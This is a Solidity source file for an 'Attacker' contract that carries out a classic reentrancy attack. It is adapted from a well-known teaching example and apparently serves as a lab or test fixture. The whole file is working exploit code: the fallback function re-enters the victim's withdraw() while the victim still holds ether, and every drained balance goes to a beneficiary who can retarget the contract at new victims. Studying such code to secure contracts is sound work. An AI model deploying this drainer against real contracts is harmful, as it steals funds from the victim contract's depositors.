// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// inspired by https://solidity-by-example.org/hacks/re-entrancy/

interface IClient {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker {
    address immutable beneficiary;
    address public victim;

    constructor(address _beneficiary, address _victim) {
        beneficiary = _beneficiary;
        victim = _victim;
    }

    fallback() external payable {
        if (victim.balance > 0) {
            attack();
        }
    }

    function deposit() external payable {
        IClient(victim).deposit{value: msg.value}();
    }

    function attack() public {
        IClient(victim).withdraw();
        beneficiary.call{value: address(this).balance}("");
    }

    function setVictim(address _victim) external {
        require(msg.sender == beneficiary);
        victim = _victim;
    }
}
